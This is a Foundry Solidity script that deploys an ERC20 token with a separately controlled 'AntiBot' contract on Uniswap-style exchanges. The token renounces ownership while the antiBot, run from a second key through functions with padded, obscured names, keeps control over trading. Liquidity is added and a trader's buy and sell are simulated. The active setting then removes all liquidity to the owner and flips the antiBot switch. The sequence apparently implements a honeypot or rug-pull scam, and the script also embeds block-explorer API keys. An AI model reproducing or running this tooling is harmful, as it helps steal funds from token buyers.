// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity >=0.8.5;

import {Script} from "forge-std/Script.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {Vm} from "forge-std/Vm.sol";

import {ERC20} from "../src/Token.sol";
import {AntiBot} from "../src/antiBot.sol";
import {Proxy} from "../src/proxy.sol";

import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract NewTokenDeployer is Script, StdCheats {
    //  ETHEREUM
    IUniswapV2Router02 router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Factory factory =
        IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    //  BASE
    // IUniswapV2Router02 router =
    //     IUniswapV2Router02(0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24);
    // IUniswapV2Factory factory =
    //     IUniswapV2Factory(0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6);
    //  BSC
    // IUniswapV2Router02 router =
    //     IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // IUniswapV2Factory factory =
    //     IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);

    AntiBot antiBot =
        AntiBot(payable(0xFEB4b5348C80418aC2fcC375837587C7Ce0145d3));
    //Proxy proxy = Proxy(payable(0xCD25Ac126D0335F63EfE3586bD55EBD400a34d96));
    ERC20 newToken = ERC20(payable(0x66B55B5DaAA22e2023df596b061600a31ee3477D));

    address[] pathBuy = new address[](2);
    address[] pathSell = new address[](2);

    bool BROADCASTING = true;

    bool DEPLOYE_NEW = false;
    bool ADD_LIQUIDITY = false;
    bool CHANGE_DELAY = false;
    bool REMOVE_LIQ = true;
    bool PING = false;
    bool EXEC_CUSTOM = false;

    function run() public {
        // (address owner, uint256 ownerKey) = makeAddrAndKey(
        //     "owner_ftrkgyehty1325135354684trehtrxdeuigefwrfe15684684tgr"
        // );

        uint ownerKey = vm.envUint("OWNER_PK");
        address owner = vm.addr(ownerKey);
        vm.label(owner, "owner wallet");

        uint antiBotKey = vm.envUint("ANTIBOT_PK");
        address antiBotWallet = vm.addr(ownerKey);
        vm.label(antiBotWallet, "antiBot wallet");

        // (address antiBotWallet, uint256 antiBotKey) = makeAddrAndKey(
        //     "antiBot_ftrkgyehty1325135354684trehtrxdeuigefwrfe15684684tgr"
        // );

        console2.log("Miner address: ", block.coinbase);
        console2.log("Miner balance: ", block.coinbase.balance);
        console2.log("block.basefee: ", block.basefee);
        console2.log("block.prevrandao: ", block.prevrandao);

        console2.log("chainid: ", block.chainid);

        uint console2Size;

        assembly {
            console2Size := extcodesize(
                0x000000000000000000636F6e736F6c652e6c6f67
            )
        }

        console2.log("code size: ", console2Size);

        // console2.log Bytes32(bytes32(antiBotKey));
        //console2.logBytes32(bytes32(ownerKey));

        if (EXEC_CUSTOM) {
            vm.broadcast(antiBotKey);
            payable(owner).transfer(antiBotWallet.balance);
        }

        console2.log("owner: ", owner);
        // console2.log("anti bot: ", antiBotWallet);
        console2.log("owner balance before: ", owner.balance);

        if (!BROADCASTING) {
            payable(owner).transfer(1.5 ether);
        }

        address[] memory whitelistAddresses = new address[](2);
        whitelistAddresses[0] = owner;
        whitelistAddresses[1] = address(router);

        if (CHANGE_DELAY) {
            vm.broadcast(antiBotKey);
            antiBot.changeBlockDelay4568468541621584(3);
            //antiBot.changeAllowAll14684684165135468465(true);
        }

        if (PING) {
            vm.broadcast(antiBotKey);
            antiBot.ping1687415457874646548784654();
        }

        if (DEPLOYE_NEW) {
            vm.startBroadcast(antiBotKey);
            antiBot = new AntiBot(whitelistAddresses);
            //proxy = new Proxy(address(antiBot)); //target
            vm.stopBroadcast();

            vm.broadcast(ownerKey);
            newToken = new ERC20(address(antiBot));

            // console2.log(
            //     "forge verify-contract --guess-constructor-args --rpc-url https://mainnet.base.org -e HIYHU4TYQE45C2W6F6BBN6JIVRSCZ6Q356 ",
            //     address(proxy),
            //     " src/proxy.sol:Proxy"
            // );

            //vm.broadcast(antiBotKey);
            //proxy.addAdmin(address(newToken));

            console2.log(
                "forge verify-contract --guess-constructor-args --rpc-url https://ethereum-rpc.publicnode.com -e KT5VYSX5F9CHQ9K2KIZ5WMAERKQAM2XWK1 ",
                address(newToken),
                " src/Token.sol:ERC20"
            );

            pathBuy[0] = router.WETH();
            pathBuy[1] = address(newToken);

            pathSell[0] = pathBuy[1];
            pathSell[1] = pathBuy[0];

            vm.broadcast(antiBotKey);
            antiBot.changeWhitelist46848621332154866486(
                address(newToken),
                true
            );

            vm.startBroadcast(ownerKey);
            console2.log("token address: ", address(newToken));
            // newToken.openTrading{value: 0.4 ether}();
            newToken.renounceOwnership();
            vm.stopBroadcast();
        }

        if (ADD_LIQUIDITY) {
            vm.startBroadcast(ownerKey);
            newToken.openTrading{value: 0.5 ether}();

            pathBuy[0] = router.WETH();
            pathBuy[1] = address(newToken);

            router.swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: 0.001 ether
            }(0, pathBuy, owner, block.timestamp + 300);
            vm.stopBroadcast();

            // vm.broadcast(antiBotKey);
            // antiBot.changeBlockDelay4568468541621584(2);
        }

        if (false) {
            //AccessListvm.stopBroadcast();
            address pair = factory.getPair(router.WETH(), address(newToken));
            (address cindy, uint256 cindyKey) = makeAddrAndKey("Cindy");
            payable(cindy).transfer(0.25 ether);

            vm.startBroadcast(cindyKey);
            for (uint i = 0; i < 2; i++) {
                router.swapExactETHForTokensSupportingFeeOnTransferTokens{
                    value: 0.1 ether
                }(0, pathBuy, cindy, block.timestamp + 30);
                uint cindyTokenBalance = newToken.balanceOf(cindy);
                //console2.log("Block number: ", block.number);
                //vm.roll(block.number + 5);
                // console2.log(
                //     "Cindy buy block: ",
                //     antiBot.addressToBuyBlock(cindy)
                // );
                // console2.log(
                //     "Pair buy block: ",
                //     antiBot.addressToBuyBlock(pair)
                // );
                console2.log("Cindy token balance before: ", cindyTokenBalance);

                newToken.approve(address(router), type(uint).max);

                console2.log("Block number: ", block.number);

                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    cindyTokenBalance,
                    0,
                    pathSell,
                    cindy,
                    block.timestamp + 30
                );

                console2.log(
                    "Cindy token balance after: ",
                    newToken.balanceOf(cindy)
                );
            }

            vm.stopBroadcast();
        }

        // console2.log("Balance before: ", owner.balance);

        if (REMOVE_LIQ) {
            address pair = factory.getPair(router.WETH(), address(newToken));

            vm.startBroadcast(ownerKey);
            ERC20(payable(pair)).approve(address(router), type(uint).max);
            router.removeLiquidityETH(
                address(newToken),
                ERC20(payable(pair)).balanceOf(owner),
                0,
                0,
                owner,
                block.timestamp + 100
            );

            console2.log("Balance after: ", address(owner).balance);
            vm.stopBroadcast();

            vm.broadcast(antiBotKey);
            antiBot.changeAllowAll14684684165135468465(true);
        }

        console2.log("owner balance after: ", owner.balance);

        // // console2.log("Balance after: ", owner.balance);

        //KT5VYSX5F9CHQ9K2KIZ5WMAERKQAM2XWK1
        //forge verify-contract 0x2e6237f6409Bb4f85B52795C2De31beD15620e63 --chain-id 1 src/NewToken.sol:NewToken -e KT5VYSX5F9CHQ9K2KIZ5WMAERKQAM2XWK1
        //https://rpc.mevblocker.io
        //BSC 23KEXQ3CCI6NHXMGFA1P7BN23NBZ2MT3MG
    }
}
